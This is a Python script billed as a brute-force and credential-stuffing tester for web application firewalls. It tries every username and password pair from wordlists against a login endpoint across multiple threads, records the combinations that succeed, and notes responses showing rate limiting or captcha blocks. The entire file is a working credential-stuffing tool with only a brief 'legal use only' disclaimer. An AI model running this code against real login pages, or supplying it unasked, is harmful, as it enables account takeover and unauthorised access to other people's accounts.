#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Login Brute-Force & Credential Stuffing Tester
Part of the WAF Testing Suite
Author: [Your Name]
Legal use only!
"""

import requests
import threading
import time
import json
from queue import Queue
from urllib.parse import urljoin

# -------------------------
# CONFIGURATION
# -------------------------
TARGET_URL = "https://yourtargetdomain.com/login"  # HTML form or API endpoint
LOGIN_TYPE = "form"  # "form" or "json"

USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "passwords.txt"

THREADS = 10
DELAY_BETWEEN_REQUESTS = 0.2  # seconds between each attempt

SUCCESS_KEYWORDS = ["Welcome", "Dashboard", "token", "success"]  # Adjust based on app
BLOCK_KEYWORDS = ["Too many attempts", "blocked", "captcha"]

FORM_FIELD_USER = "username"
FORM_FIELD_PASS = "password"

JSON_FIELD_USER = "username"
JSON_FIELD_PASS = "password"

LOG_SUCCESS_FILE = "success_logins.txt"
LOG_FAILURE_FILE = "failed_logins.txt"
LOG_BLOCK_FILE = "waf_blocks.txt"

# -------------------------
# LOAD CREDENTIALS
# -------------------------
def load_list(filename):
    with open(filename, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

usernames = load_list(USERNAME_FILE)
passwords = load_list(PASSWORD_FILE)

# Generate all user/pass combos
combo_queue = Queue()
for u in usernames:
    for p in passwords:
        combo_queue.put((u, p))

# -------------------------
# WORKER FUNCTION
# -------------------------
def attempt_login(username, password):
    try:
        if LOGIN_TYPE == "form":
            data = {
                FORM_FIELD_USER: username,
                FORM_FIELD_PASS: password
            }
            r = requests.post(TARGET_URL, data=data, timeout=5)
        elif LOGIN_TYPE == "json":
            payload = {
                JSON_FIELD_USER: username,
                JSON_FIELD_PASS: password
            }
            r = requests.post(TARGET_URL, json=payload, timeout=5)
        else:
            print("[ERROR] Invalid LOGIN_TYPE")
            return

        body = r.text
        status = r.status_code

        # Detect WAF blocks
        if any(block_msg.lower() in body.lower() for block_msg in BLOCK_KEYWORDS):
            log(LOG_BLOCK_FILE, f"{username}:{password} | BLOCKED by WAF")
            print(f"[BLOCK] {username}:{password}")
            return

        # Detect success
        if any(success_kw.lower() in body.lower() for success_kw in SUCCESS_KEYWORDS):
            log(LOG_SUCCESS_FILE, f"{username}:{password} | SUCCESS")
            print(f"[SUCCESS] {username}:{password}")
        else:
            log(LOG_FAILURE_FILE, f"{username}:{password} | FAIL")
            print(f"[FAIL] {username}:{password} ({status})")

    except requests.RequestException as e:
        print(f"[ERROR] {username}:{password} | {e}")

# -------------------------
# LOGGING FUNCTION
# -------------------------
def log(filename, text):
    with threading.Lock():
        with open(filename, "a", encoding="utf-8") as f:
            f.write(text + "\n")

# -------------------------
# THREAD WORKER
# -------------------------
def worker():
    while not combo_queue.empty():
        try:
            username, password = combo_queue.get_nowait()
        except:
            break
        attempt_login(username, password)
        time.sleep(DELAY_BETWEEN_REQUESTS)

# -------------------------
# MAIN
# -------------------------
if __name__ == "__main__":
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[DONE] Testing completed.")
